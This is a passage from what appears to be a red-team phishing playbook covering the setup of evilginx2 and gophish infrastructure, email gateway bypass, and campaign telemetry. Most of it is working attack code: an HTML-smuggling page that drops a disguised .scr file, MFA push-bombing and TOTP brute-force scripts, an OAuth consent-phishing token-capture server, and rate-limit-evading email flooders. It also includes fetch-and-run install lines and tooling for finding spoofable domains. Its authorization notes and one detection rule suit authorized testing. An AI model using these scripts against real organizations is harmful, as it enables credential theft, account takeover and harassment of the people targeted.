```bash
# Connect to evilginx2 CLI (use REST API or netcat to its control port if needed;
# for the lab, simply run interactively and then enable as service after config)

sudo /opt/evilginx2/evilginx -p /opt/evilginx2/phishlets -d <<'EOF'
config domain <phish-domain>
config ip <vps_public_ip>
phishlets hostname office365 login.<phish-domain>
phishlets enable office365
lures create office365
lures get-url 0
EOF

# Save the printed lure URL — gophish will redirect victims to this
```

### 16.5 gophish Build, Config, Launch

```bash
cd /opt
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip -d /opt/gophish
chmod +x /opt/gophish/gophish

# Lock admin UI to localhost (edit config.json before first launch)
sudo sed -i 's/"listen_url": "0.0.0.0:3333"/"listen_url": "127.0.0.1:3333"/' /opt/gophish/config.json

# Launch gophish as systemd service
sudo tee /etc/systemd/system/gophish.service > /dev/null <<'EOF'
[Unit]
Description=gophish campaign platform
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=/opt/gophish
ExecStart=/opt/gophish/gophish
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now gophish

# Tunnel admin UI to your workstation (do NOT expose publicly)
# From your workstation:
ssh -L 3333:127.0.0.1:3333 user@<vps_public_ip>
# Then open https://localhost:3333/ in your browser
# Capture the initial admin password from `journalctl -u gophish`
# CHANGE it immediately, then generate an API key in Account Settings
```

### 16.6 nginx Reverse Proxy (TLS termination + beacon routing)

```nginx
# /etc/nginx/sites-available/<phish-domain>
server {
    listen 443 ssl http2;
    server_name login.<phish-domain>;

    ssl_certificate     /etc/letsencrypt/live/<phish-domain>/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/<phish-domain>/privkey.pem;

    # evilginx2 listens on 127.0.0.1:8443 (set via `config port 8443` in evilginx CLI)
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Beacon server runs on 127.0.0.1:5000 (Flask)
    location /beacon/ {
        proxy_pass http://127.0.0.1:5000;
    }
}

server {
    listen 80;
    server_name login.<phish-domain> <phish-domain>;
    return 301 https://$host$request_uri;
}
```

```bash
# Obtain Let's Encrypt cert (if evilginx2 not handling ACME itself)
sudo certbot certonly --nginx -d login.<phish-domain> -d <phish-domain>
sudo ln -s /etc/nginx/sites-available/<phish-domain> /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

### 16.7 Operational Verification Checklist

```bash
# All of these must pass before the campaign launches

# 1. DNS resolves correctly
test "$(dig +short login.<phish-domain> | head -1)" = "<vps_public_ip>" && echo OK || echo FAIL

# 2. TLS cert valid
echo | openssl s_client -connect login.<phish-domain>:443 -servername login.<phish-domain> 2>/dev/null \
  | openssl x509 -noout -subject -dates

# 3. evilginx2 responding (expect a redirect)
curl -sI https://login.<phish-domain>/<lure_id> | head -3

# 4. gophish admin UI reachable via SSH tunnel
curl -ksI https://127.0.0.1:3333/ | head -1   # 200 OK after tunnel established

# 5. Beacon server responding
curl -s https://login.<phish-domain>/beacon/open?id=test | file -  # PNG image
```

---

## 17. Gateway Bypass Techniques — Unified Playbook

> Consolidated techniques for bypassing Proofpoint, Mimecast, Cisco ESA, and Microsoft Defender for Office. Each technique is rated for effectiveness and detection risk.

### 17.1 URL Defense / Safe Links Rewriting Evasion

```bash
# Test which of your look-alike domains escape rewriting
# (Some configs exclude internal or trusted-domain senders)

LOOKALIKES="micros0ft-login.com m1crosoft-login.com microsoft-security.net msft-secure-login.com"

for d in $LOOKALIKES; do
  # Send probe mail with a tracking link to a probe mailbox you control
  swaks --to probe@<target.com> \
    --from "test@$d" \
    --server mail.<target.com> \
    --header "Subject: probe for $d" \
    --header "Content-Type: text/html" \
    --body "<a href='https://$d/test'>click</a>"

  echo "Probe sent from $d — inspect received mail for URL rewriting"
done

# On the probe mailbox side, inspect each received mail:
#   grep -oE 'https?://[^"<> ]+' /var/mail/probe | sort -u
# If URL is original → domain escaped rewriting
# If URL contains urldefense.proofpoint.com or safelinks.protection.outlook.com → rewritten
```

```python
#!/usr/bin/env python3
# classify_rewrite.py — parse a mailbox and classify URLs as rewritten vs original
import re, sys, mailbox

REWRITER_PATTERNS = [
    r'urldefense\.proofpoint\.com',           # Proofpoint URL Defense
    r'safelinks\.protection\.outlook\.com',   # Microsoft Defender Safe Links
    r'protect\.mimecast\.com',                # Mimecast URL expansion
    r'casetest\.email\.cisco\.com',           # Cisco ESA URL rewrite
]

def classify(url):
    for pat in REWRITER_PATTERNS:
        if re.search(pat, url, re.I):
            return ('rewritten', pat)
    return ('original', None)

for msg in mailbox.mbox(sys.argv[1]):
    body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
    for url in set(re.findall(r'https?://[^\s"<>]+', body)):
        status, matcher = classify(url)
        print(f'{status:10s} {url}')
```

### 17.2 Attachment Sandbox Evasion — Encrypted-Zip Pattern

```bash
# Build an encrypted-zip with a benign payload for sandbox-bypass testing
# (Real engagements use this to deliver a stager; lab uses a benign calc-equivalent)

# 1. Build a benign test binary (C source)
cat > /tmp/benign.c <<'EOF'
#include <stdio.h>
int main() {
    printf("lab benign payload executed\n");
    return 0;
}
EOF
gcc /tmp/benign.c -o /tmp/benign_payload

# 2. Encrypt in a zip (password sent via separate channel)
PASSWORD='REPLACE_WITH_YOUR_ZIP_PASSWORD'
zip -e -P "$PASSWORD" /tmp/document.zip /tmp/benign_payload

# 3. Send via swaks (mimics what gophish would send)
swaks --to probe@<target.com> \
  --from "DocShare <noreply@<phish-domain>>" \
  --server mail.<target.com> \
  --header "Subject: Q2 document for review" \
  --header "Content-Type: multipart/mixed; boundary=\"BOUND\"" \
  --body "$(cat <<BODY
--BOUND
Content-Type: text/plain

Hi, please review the attached document. Password sent separately via Signal.

--BOUND
Content-Type: application/zip
Content-Disposition: attachment; filename="document.zip"
Content-Transfer-Encoding: base64

$(base64 -w0 /tmp/document.zip)

--BOUND--
BODY
)"
```

### 17.3 HTML Smuggling (Attachment Sandbox Bypass)

```html
<!-- smuggle.html — gateway sees only HTML/JS; binary reconstructed client-side -->
<!DOCTYPE html>
<html>
<head><title>Confidential Document</title></head>
<body>
<h3>Loading document...</h3>
<script>
// Placeholder base64 — in real engagements this is a stager payload
// NEVER hard-code real payload bytes; pull from C2 at click time for OPSEC
const PAYLOAD_B64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAAaaaaaaaaaaaaaaaaaaa==";

function downloadBlob() {
  const bin = atob(PAYLOAD_B64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const blob = new Blob([bytes], {type: 'application/octet-stream'});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'document.pdf.scr';   // .scr to defeat extension-based filtering
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
window.setTimeout(downloadBlob, 1500);  // delay defeats some sandbox VM checks
</script>
</body>
</html>
```

### 17.4 Sender Reputation Bypass via ESP Relay

```bash
# Use a legitimate ESP (Mailgun, SendGrid, Amazon SES) for delivery
# — they have warmed-up IPs and pre-established reputation

# Mailgun example (REPLACE_WITH_YOUR_ESP_KEY stored in env, never in code)
curl -s --user "api:$MAILGUN_API_KEY" \
  "https://api.mailgun.net/v3/<phish-domain>/messages" \
  -F from="DocShare <noreply@<phish-domain>>" \
  -F to="probe@<target.com>" \
  -F subject="Document Review" \
  -F html="<html><body>Click <a href='https://login.<phish-domain>/lure/0'>here</a></body></html>" \
  -F o:tracking=false \
  -F o:tag='redteam-campaign'

# Note: ESPs log all sends and cooperate with law enforcement; use only with
# explicit authorization and within the test window
```

### 17.5 Gateway Bypass Decision Matrix

| Gateway Feature | Bypass Technique | Effectiveness | Detection Risk |
|-----------------|------------------|---------------|----------------|
| URL rewriting (Proofpoint URL Defense) | Delayed DNS rotation / fast-flux | Medium | High (CT logs catch new certs) |
| URL rewriting (Defender Safe Links) | Look-alike domain in allowed TLD | Low | Low |
| Attachment sandbox (Safe Attachments) | Encrypted-zip | High | Low |
| Attachment sandbox (Cisco ESA) | HTML smuggling, .iso/.img | High | Low |
| Sender reputation (all) | ESP relay (Mailgun/SendGrid) | High | Medium |
| DMARC enforcement (`p=reject`) | Look-alike domain (no real-brand spoof) | High | Low |
| DKIM signature required | Self-sign look-alike domain | High | Low |
| Conditional Access (require compliant device) | None — out-of-band attack pivot | N/A | N/A |

---

## 18. MFA Fatigue and BFA (Brute-Force MFA) Payloads

> MFA fatigue (also known as "push bombing") floods a victim with MFA prompts until they approve one out of annoyance. Authorization required — this is a real attack vector used by LAPSUS$ and others, and unauthorized use is a crime.

### 18.1 Push Bombing — Reconnaissance

```bash
# Identify which users in scope use push MFA (vs TOTP, SMS, FIDO2)
# In Microsoft Graph (requires AuditLog.Read.All permission)
Connect-MgGraph -Scopes "UserAuthenticationMethod.Read.All,AuditLog.Read.All"

# List users with push MFA enabled
Get-MgUser -All | ForEach-Object {
  $upn = $_.UserPrincipalName
  $methods = Get-MgUserAuthenticationMethod -UserId $upn
  $methods | Where-Object { $_.AdditionalProperties.'@odata.type' -match 'microsoftAuthenticator' } |
    ForEach-Object { Write-Host "$upn → push (Microsoft Authenticator)" }
}
```

### 18.2 Push Bombing — Triggering Repeated Prompts

```bash
# Repeatedly trigger MFA by submitting the victim's credential to the real
# login endpoint. Each successful credential submit triggers a fresh push.
#
# This requires already-having the victim's password (e.g., from breach data,
# OSINT, or a prior AiTM credential capture without session).

# Pseudocode — adapt to your target IdP
python3 <<'EOF'
import requests, time

IDP_LOGIN = 'https://login.microsoftonline.com/common/GetCredentialType'
VICTIM_UPN = 'user_push@<target>.onmicrosoft.com'
VICTIM_PW  = 'REPLACE_WITH_YOUR_CAPTURED_PASSWORD'
INTERVAL   = 30   # seconds between prompts; too fast trips rate-limit
DURATION   = 600  # 10 minutes of push bombing

start = time.time()
count = 0
while time.time() - start < DURATION:
    # Trigger MFA by initiating a real sign-in
    r = requests.post(IDP_LOGIN, json={'username': VICTIM_UPN, 'isOtherIdpSupported': True})
    count += 1
    print(f"[{count}] prompt triggered, HTTP {r.status_code}")
    time.sleep(INTERVAL)
EOF

# Note: Modern Azure AD throttles after 3-5 rapid prompts per minute.
# Realistic attackers space prompts 30-60s apart and target off-hours
# (late night local time) when the victim is sleepy / less vigilant.
```

### 18.3 BFA (Brute-Force Authentication Code) for TOTP

```python
#!/usr/bin/env python3
# bfa_totp.py — brute-force a 6-digit TOTP code within its 30-second window
# Rate limits make this largely impractical against modern IdPs; documented
# for completeness. Most IdPs lock after 5-10 failed attempts per window.
import time, requests, itertools, concurrent.futures

TARGET_URL = 'https://login.<target>.com/mfa/verify'
VICTIM_SESSION = 'REPLACE_WITH_YOUR_SESSION_COOKIE'

def attempt(code):
    r = requests.post(TARGET_URL,
                      cookies={'session': VICTIM_SESSION},
                      data={'code': code})
    return code, r.status_code == 200

# Try all 1M codes — but most IdPs will lock out after ~10 attempts
codes = [f'{i:06d}' for i in range(1000000)]
window_start = time.time()
window_end   = window_start + 30  # TOTP window

with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:  # serial to avoid rate-limit
    for code in codes:
        if time.time() > window_end:
            print('window expired')
            break
        c, success = attempt(code)
        if success:
            print(f'CODE FOUND: {c}')
            break
        time.sleep(0.5)  # respect rate-limit
```

### 18.4 AiTM OAuth Token Theft (Alternative to Push Bombing)

```python
#!/usr/bin/env python3
# oauth_consent_phish.py — register a malicious Azure AD app and phish consent
# Effective even against FIDO2-protected users (consent doesn't trigger MFA)
# REQUIRES: an Azure AD tenant you control to register the malicious app

# 1. Register an Azure AD app with these scopes ( Graph API ):
#    - Mail.Read
#    - User.Read.All
#    - Files.Read.All
#    - offline_access   (← enables refresh tokens; long-lived access)

# 2. Build the consent URL
APP_ID = 'REPLACE_WITH_YOUR_APP_CLIENT_ID'
REDIRECT = 'https://login.<phish-domain>/oauth/callback'
SCOPES = 'Mail.Read User.Read.All Files.Read.All offline_access'

CONSENT_URL = (
    f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
    f'?client_id={APP_ID}'
    f'&response_type=code'
    f'&redirect_uri={REDIRECT}'
    f'&scope={SCOPES}'
    f'&prompt=consent'
)
print('Send victim to:', CONSENT_URL)

# 3. Victim consents → Azure AD redirects to your callback with ?code=...
# 4. Exchange code for access + refresh tokens:
from flask import Flask, request
import requests as rq

app = Flask(__name__)

@app.route('/oauth/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return 'missing code', 400

    # Exchange code for tokens (server-side, victim never sees the token)
    token_resp = rq.post(
        'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        data={
            'client_id': APP_ID,
            'client_secret': 'REPLACE_WITH_YOUR_APP_SECRET',
            'code': code,
            'redirect_uri': REDIRECT,
            'grant_type': 'authorization_code',
            'scope': SCOPES,
        }
    )
    tokens = token_resp.json()
    # Store access_token and refresh_token securely per SoW
    log_consent_capture(tokens.get('expires_in'), tokens.get('scope'))
    return 'Thank you. You may close this window.'

def log_consent_capture(expires_in, scope):
    # Log without storing the actual token in plaintext logs
    print(f'[capture] expires_in={expires_in} scope={scope}')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

---

## 19. Email Bombing — Rate-Limit Evasion and Variants

> Already covered in Section 11 (basic BombErAtom + custom Python). This section extends with rate-limit evasion, multi-provider rotation, and defense-side detection rules.

### 19.1 Multi-Provider Rotation Flooder

```python
#!/usr/bin/env python3
# rotate_flood.py — distribute flood across multiple ESPs to evade per-sender rate limits
# Each provider has its own per-sender-per-hour limit; rotating bypasses single-provider caps
import smtplib, threading, time, itertools
from email.mime.text import MIMEText

TARGET = 'victim@<target.com>'
COUNT_PER_PROVIDER = 50
THREADS = 4

# Each tuple: (smtp_host, port, username, password, from_addr)
# Populate from your authorized ESP accounts — NEVER hard-code real creds in source
PROVIDERS = [
    ('smtp.mailgun.org',   587, 'mg-user',     'REPLACE_WITH_YOUR_MAILGUN_PW',    'mg@<phish-domain>'),
    ('smtp.sendgrid.net',  587, 'apikey',      'REPLACE_WITH_YOUR_SENDGRID_KEY',  'sg@<phish-domain>'),
    ('email-smtp.us-east-1.amazonaws.com', 587, 'ses-user', 'REPLACE_WITH_YOUR_SES_PW', 'ses@<phish-domain>'),
]

def flood_one_provider(provider, count, stop):
    host, port, user, pw, sender = provider
    sent = 0
    while not stop.is_set() and sent < count:
        try:
            msg = MIMEText(f"notification {time.time()}")
            msg['Subject'] = 'reminder'
            msg['From'] = sender
            msg['To'] = TARGET
            with smtplib.SMTP(host, port, timeout=10) as s:
                s.starttls()
                s.login(user, pw)
                s.sendmail(sender, [TARGET], msg.as_string())
            sent += 1
            time.sleep(2)  # be gentle — the goal is volume across providers, not per-provider speed
        except Exception as e:
            print(f'error from {host}: {e}')
            time.sleep(10)
    print(f'{host}: sent {sent}/{count}')

if __name__ == '__main__':
    stop = threading.Event()
    threads = []
    for provider in PROVIDERS:
        for _ in range(THREADS):
            t = threading.Thread(target=flood_one_provider, args=(provider, COUNT_PER_PROVIDER, stop))
            t.start()
            threads.append(t)
    for t in threads: t.join()
```

### 19.2 Slow-Drip Flooder (Evades Per-Minute Rate Alerts)

```python
#!/usr/bin/env python3
# slow_drip.py — sends 1 msg/min/sender over 24h to fly under per-minute alert thresholds
# Total volume over time equals a flood, but no single minute triggers rate alerts
import smtplib, time
from email.mime.text import MIMEText

TARGET = 'victim@<target.com>'
HOURS = 24
PER_HOUR = 60   # 1/min — under most gateway rate alerts

# Cycle through sender identities (each looks like a different legitimate sender)
SENDERS = [
    'noreply@<phish-domain>',
    'admin@<phish-domain>',
    'support@<phish-domain>',
    'alerts@<phish-domain>',
    'billing@<phish-domain>',
]

def drip():
    start = time.time()
    end = start + HOURS * 3600
    count = 0
    while time.time() < end:
        sender = SENDERS[count % len(SENDERS)]
        msg = MIMEText(f'message {count}')
        msg['Subject'] = f'notice {count}'
        msg['From'] = sender
        msg['To'] = TARGET
        try:
            with smtplib.SMTP('mail.<phish-domain>', 587, timeout=10) as s:
                s.starttls()
                s.login(sender, 'REPLACE_WITH_YOUR_SMTP_PW')
                s.sendmail(sender, [TARGET], msg.as_string())
            count += 1
        except Exception as e:
            print(f'error: {e}')
        time.sleep(3600 / PER_HOUR)

if __name__ == '__main__':
    drip()
```

### 19.3 Defense-Side Detection Rule (per-recipient flood)

```bash
# Aggregate inbound to single mailbox per minute from diverse senders
# Postfix log example:
awk '/to=<victim@<target>\.com>/ && /status=sent/ {
        ts = substr($1,1,15)":"substr($2,1,5)
        from = ""
        for (i=1; i<=NF; i++) if ($i ~ /^from=/) from = $i
        key = ts"|"from
        count[key]++
     }
     END {
        for (k in count) print count[k], k
     }' /var/log/mail.log | sort -rn | head -20

# Alert rule: if > 50 unique senders delivering to a single recipient in 5 min, trigger flood alert
# PagerDuty / Slack hook config omitted — adapt to your IR workflow

# Microsoft 365 equivalent (Exchange Online PowerShell):
# Get-MessageTrace -RecipientAddress victim@target.com -StartDate (Get-Date).AddHours(-1) -EndDate (Get-Date) |
#   Group-Object SenderAddress |
#   Where-Object { $_.Count -gt 50 } |
#   Format-Table Count, Name
```

---

## 20. DMARC / SPF / DKIM Reconnaissance and Abuse

> Protocol-level fundamentals covered in `skills/email-protocol-attack/`. This section covers the *campaign-operations* angle: how attackers enumerate a target's mail-auth posture to identify spoofable identities and weak alignment.

### 20.1 Automated Posture Recon (Multiple Domains)

```bash
#!/usr/bin/env bash
# dmarc_recon.sh — enumerate mail-auth posture for a list of domains
# Output: per-domain row indicating DMARC policy, SPF record, DKIM selectors, MX hosts

DOMAINS_FILE="${1:-domains.txt}"

while read -r d; do
  [ -z "$d" ] && continue

  printf '%-30s ' "$d"

  # DMARC policy
  dmarc=$(dig +short TXT _dmarc.$d | tr -d '"' | head -1)
  policy=$(echo "$dmarc" | grep -oE 'p=[a-z]+' | cut -d= -f2)
  printf 'DMARC=%-10s ' "${policy:-none}"

  # SPF
  spf=$(dig +short TXT $d | tr -d '"' | grep -o 'v=spf1[^"]*')
  if [ -n "$spf" ]; then
    if echo "$spf" | grep -q '\-all'; then spfpolicy='hardfail'
    elif echo "$spf" | grep -q '\~all'; then spfpolicy='softfail'
    elif echo "$spf" | grep -q '\?all'; then spfpolicy='neutral'
    elif echo "$spf" | grep -q 'all'; then spfpolicy='passall'
    else spfpolicy='unknown'
    fi
  else
    spfpolicy='missing'
  fi
  printf 'SPF=%-10s ' "$spfpolicy"

  # MX
  mx=$(dig +short MX $d | head -1 | awk '{print $2}')
  printf 'MX=%-30s\n' "${mx:-none}"

done < "$DOMAINS_FILE"

# Sample output:
#   target.com       DMARC=reject    SPF=hardfail    MX=target-com.mail.protection.outlook.com.
#   sub1.target.com  DMARC=none      SPF=missing     MX=none                            ← orphaned subdomain, spoofable!
```

### 20.2 DKIM Selector Enumeration

```bash
#!/usr/bin/env bash
# dkim_enum.sh — try common DKIM selectors for a domain
DOMAIN="$1"
SELECTORS="default google s1 s2 selector1 selector2 mail galaxy microsoft office365 k1"

for s in $SELECTORS; do
  result=$(dig +short TXT "$s._domainkey.$DOMAIN")
  if [ -n "$result" ]; then
    echo "FOUND: $s._domainkey.$DOMAIN → $(echo $result | head -c 80)..."
  fi
done

# Common O365 selector: selector1._domainkey.<tenant>.onmicrosoft.com
# Common Google Workspace: google._domainkey.<domain>
# Common Mailgun: mta._domainkey.<domain>
```

### 20.3 Spoofable-Identity Identification

```python
#!/usr/bin/env python3
# identify_spoofable.py — combine DMARC + SPF + subdomain enumeration to find spoofable identities
# A domain is "spoofable" if DMARC is p=none or missing AND no SPF enforcement
import dns.resolver, subprocess

def lookup_txt(name):
    try:
        answers = dns.resolver.resolve(name, 'TXT')
        return [r.to_text().strip('"') for r in answers]
    except Exception:
        return []

def assess_domain(d):
    dmarc = lookup_txt(f'_dmarc.{d}')
    spf = [t for t in lookup_txt(d) if 'v=spf1' in t]

    dmarc_policy = 'none'
    for t in dmarc:
        if 'p=reject' in t: dmarc_policy = 'reject'
        elif 'p=quarantine' in t: dmarc_policy = 'quarantine'
        elif 'p=none' in t: dmarc_policy = 'none'

    spf_enforced = any('-all' in t for t in spf)

    if dmarc_policy == 'reject':
        return ('safe', 'DMARC reject')
    if dmarc_policy == 'quarantine':
        return ('mostly safe', 'DMARC quarantine')
    if spf_enforced and dmarc_policy == 'none':
        return ('partial', 'SPF enforced but DMARC none — spoof with aligned header')
    return ('spoofable', f'DMARC={dmarc_policy}, SPF_enforced={spf_enforced}')

# Enumerate subdomains via crt.sh (certificate transparency)
def get_subdomains(d):
    import requests
    r = requests.get(f'https://crt.sh/?q=%.{d}&output=json', timeout=30)
    if r.status_code != 200:
        return []
    subs = set()
    for entry in r.json():
        for name in entry.get('name_value', '').split('\n'):
            name = name.strip().lstrip('*.')
            if name.endswith(d):
                subs.add(name)
    return sorted(subs)

if __name__ == '__main__':
    import sys
    domain = sys.argv[1]
    print(f'Assessing {domain} and subdomains...')
    for sub in [domain] + get_subdomains(domain):
        verdict, reason = assess_domain(sub)
        flag = '⚠️ ' if verdict == 'spoofable' else '   '
        print(f'{flag}{verdict:15s} {sub:40s} ({reason})')
```

### 20.4 ARC (Authenticated Received Chain) Inspection

```bash
# ARC preserves auth results across forwarders; inspecting it reveals
# whether forwarded mail passed auth at the original sender

# Sample ARC headers on a received mail:
#   ARC-Authentication-Results: i=1; mx.google.com;
#       dkim=pass header.i=@sender-domain.com header.s=selector1;
#       spf=pass (google.com: domain of sender@sender-domain.com designates X as permitted sender)
#       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=sender-domain.com
#   ARC-Seal: i=1; a=rsa-sha256; t=...; cv=none;
#       b=...
#   ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
#       d=google.com; ...

# Extract and display ARC chain from a saved mail:
python3 <<'EOF'
import email, sys
msg = email.message_from_file(open(sys.argv[1]))
arc_headers = [(k, v) for k, v in msg.items() if k.lower().startswith('arc-')]
for k, v in arc_headers:
    print(f'{k}: {v[:120]}')
EOF
```

---

## 21. Campaign Telemetry Aggregation and Funnel Reporting

> End-to-end script that pulls gophish + evilginx2 + beacon events and produces a unified funnel report.

### 21.1 Telemetry Schema (Unified)

```sql
-- /opt/beacon/campaign.db
CREATE TABLE IF NOT EXISTS victims (
    victim_id TEXT PRIMARY KEY,
    email TEXT,
    first_name TEXT,
    last_name TEXT,
    sent_at REAL,
    delivered_at REAL
);

CREATE TABLE IF NOT EXISTS events (
    id INTEGER PRIMARY KEY,
    ts REAL,
    victim_id TEXT,
    event TEXT,          -- sent|delivered|open|click|cred_submit|mfa_complete|session_captured|fido2_blocked|replay_attempt|replay_blocked
    meta TEXT,           -- JSON blob for additional context
    FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
);

CREATE INDEX IF NOT EXISTS idx_events_victim ON events(victim_id);
CREATE INDEX IF NOT EXISTS idx_events_event ON events(event);
```

### 21.2 Unified Funnel Report Generator

```python
#!/usr/bin/env python3
# funnel_report.py — produce campaign funnel from unified telemetry
import sqlite3, json, os, sys
from collections import defaultdict

DB = '/opt/beacon/campaign.db'

def generate_funnel():
    conn = sqlite3.connect(DB)
    victims = {row[0]: row for row in conn.execute('select * from victims')}

    # Build per-victim event timeline
    by_victim = defaultdict(set)
    for victim_id, event in conn.execute('select victim_id, event from events'):
        by_victim[victim_id].add(event)

    funnel = {
        'sent':              sum(1 for v in by_victim if 'sent' in by_victim[v]),
        'delivered':         sum(1 for v in by_victim if 'delivered' in by_victim[v]),
        'opened':            sum(1 for v in by_victim if 'open' in by_victim[v]),
        'clicked':           sum(1 for v in by_victim if 'click' in by_victim[v]),
        'cred_submitted':    sum(1 for v in by_victim if 'cred_submit' in by_victim[v]),
        'mfa_completed':     sum(1 for v in by_victim if 'mfa_complete' in by_victim[v]),
        'session_captured':  sum(1 for v in by_victim if 'session_captured' in by_victim[v]),
        'fido2_blocked':     sum(1 for v in by_victim if 'fido2_blocked' in by_victim[v]),
        'replay_attempted':  sum(1 for v in by_victim if 'replay_attempt' in by_victim[v]),
        'replay_blocked':    sum(1 for v in by_victim if 'replay_blocked' in by_victim[v]),
    }
    return funnel

def render_console(funnel):
    print('Stage               Count')
    print('─' * 30)
    for stage, count in funnel.items():
        print(f'{stage:20s} {count:5d}')

def render_markdown(funnel, output_path):
    with open(output_path, 'w') as f:
        f.write('# Campaign Funnel Report\n\n')
        f.write('| Stage | Count |\n|-------|-------|\n')
        for stage, count in funnel.items():
            f.write(f'| {stage} | {count} |\n')

if __name__ == '__main__':
    funnel = generate_funnel()
    render_console(funnel)
    if len(sys.argv) > 1:
        render_markdown(funnel, sys.argv[1])
        print(f'\nMarkdown report written to {sys.argv[1]}')
```

### 21.3 Sample Funnel Report Output

```markdown
# Campaign Funnel Report

| Stage | Count |
|-------|-------|
| sent | 100 |
| delivered | 98 |
| opened | 47 |
| clicked | 18 |
| cred_submitted | 12 |
| mfa_completed | 9 |
| session_captured | 6 |
| fido2_blocked | 3 |
| replay_attempted | 6 |
| replay_blocked | 2 |

## Derived metrics

- Delivery rate: 98/100 = 98.0%
- Open rate: 47/98 = 48.0%
- Click rate: 18/47 = 38.3%
- Credential capture rate: 12/18 = 66.7%
- MFA completion rate: 9/12 = 75.0%
- AiTM success rate: 6/9 = 66.7%
- FIDO2 block rate: 3/9 = 33.3%
- Conditional Access block rate: 2/6 = 33.3%
- Net account compromise rate: 4/100 = 4.0%
```

---

## Appendix A: Quick Command Reference

| Action | Command |
|--------|---------|
| Launch evilginx2 | `sudo ./bin/evilginx -p phishlets -d` |
| Get lure URL | `lures get-url 0` |
| List captured sessions | `sessions` |
| Launch gophish | `./gophish` |
| gophish API: create sending profile | `curl -k -X POST https://localhost:3333/api/smtp/ -H "Authorization: Bearer $KEY" -d '{...}'` |
| gophish API: launch campaign | `curl -k -X POST https://localhost:3333/api/campaigns/ -H "Authorization: Bearer $KEY" -d '{...}'` |
| Launch modlishka | `sudo ./modlishka -proxyaddress 0.0.0.0 -proxyport 443 ...` |
| Check DMARC posture | `checkdmarc target.com` |
| Verify spoofing | `python3 espoofer.py -i test.txt` |
| Send probe via swaks | `swaks --to x@y --from a@b --server mail.y` |
| Email bomb (authorized) | `python3 email_bomber.py --target x@y --count 200 --threads 8` |
| Check blacklist | `dig +short <reversed-ip>.zen.spamhaus.org A` |

## Appendix B: Tool Quick-Install

```bash
# evilginx2
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && make

# gophish (Linux ARM64)
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip && ./gophish

# King-Phisher
wget https://github.com/rsmusllp/king-phisher/raw/master/tools/install.sh && sudo bash install.sh

# espoofer
git clone https://github.com/chenjj/espoofer.git && cd espoofer && pip3 install -r requirements.txt

# checkdmarc
pip3 install checkdmarc
```
